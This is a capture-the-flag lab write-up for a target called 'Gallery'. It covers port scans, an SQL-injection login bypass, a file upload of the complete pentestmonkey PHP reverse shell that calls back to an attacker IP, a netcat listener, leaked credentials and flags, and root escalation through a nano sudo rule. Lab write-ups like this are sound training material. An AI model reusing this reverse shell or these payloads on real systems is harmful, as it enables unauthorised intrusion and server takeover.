# CTF Writeup: Gallery

---
## Reconaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sS -p- 10.114.190.73     
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-03 17:10 CDT
Nmap scan report for 10.114.190.73
Host is up (0.010s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 12.97 seconds
```

An more detailled scan revealed the following information.

```
nmap -n -Pn -sSCV -p 22,80,8080 10.114.190.73
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-03 17:11 CDT
Nmap scan report for 10.114.190.73
Host is up (0.012s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 07:d6:27:56:5b:39:4e:7b:a1:78:6a:2d:2a:1f:88:d4 (RSA)
|   256 e7:b1:73:68:41:48:2b:e1:1e:69:f2:3b:fb:f5:0d:35 (ECDSA)
|_  256 e9:8d:9e:2b:17:6c:b0:54:ee:7f:e0:db:7d:04:15:91 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Simple Image Gallery System
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
```

Upon viewing the webpage running on port 8080, we are being greeted with an "Simple Image Gallery System" including an login panel.

Upon searching for public exploits we find the following:

```
searchsploit Simple Image Gallery System

----------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
----------------------------------------------------------------------------------------- ---------------------------------
Simple Image Gallery System 1.0 - 'id' SQL Injection                                     | php/webapps/50198.txt
----------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Analyzing the exploit it suggests us that there is an SQL Injection possible in the id. We can utilize sqlmap for this.

I utilized BurpSuite & FoxyProxy in order to intercept the login.

```
POST /gallery/classes/Login.php?f=login HTTP/1.1

Host: 10.114.190.73

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 21

Origin: http://10.114.190.73

Connection: keep-alive

Referer: http://10.114.190.73/gallery/login.php

Cookie: PHPSESSID=06dej8h7pal55k56gsq632ao5a

Priority: u=0



username=&password=
```

Saved this network package inside an req.txt file.

Ran sqlmap.

```
sqlmap -r req.txt
```

This didn't work unfortunately so I tried to bypass the login panel manually.

Successfully bypassed it with this command in the username field.

```
' OR 1=1-- -
```

There were multiple upload functionalities. I clicked on the top right user icon and uploaded an php reverse shell script.

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.227.246';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>
```

Started up an listener on port 1337.

```
nc -lvnp 1337
```

Pressed on update and immediatly catched an reverse shell as user "www-data".

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.227.246] from (UNKNOWN) [10.114.190.73] 55368
Linux ip-10-114-190-73 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 23:00:10 up 50 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Discovered an locally running MySQL Database.

```
www-data@ip-10-114-190-73:/$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.114.190.73:68        0.0.0.0:*                           -
```

Found password of user "mike" in /var/backups/mike_home_backup/.bash_history

```
mike:b3stpassw0rdbr0xx
```

Retrieved user.txt in /home/mike directory.

```
THM{af05cd30bfed67849befd546ef}
```

I found database credentials inside initialize.php 

```
gallery_user:passw0rd321
```

Checked sudo permissions of user mike.

He is able to execute an rootkit.sh bash script.

```
mike@ip-10-114-190-73:/$ sudo -l
Matching Defaults entries for mike on ip-10-114-190-73:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on ip-10-114-190-73:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

I chose the "read option" and it put me into nano, we were able to write on the report.txt. Which means we can also execute commands. Let's check gtfobins for an PoC. We found one!

```
^R^X
reset; sh 1>&0 2>&0
```

Gained Root Shell & Retrieved root.txt in /root directory.

```
THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
```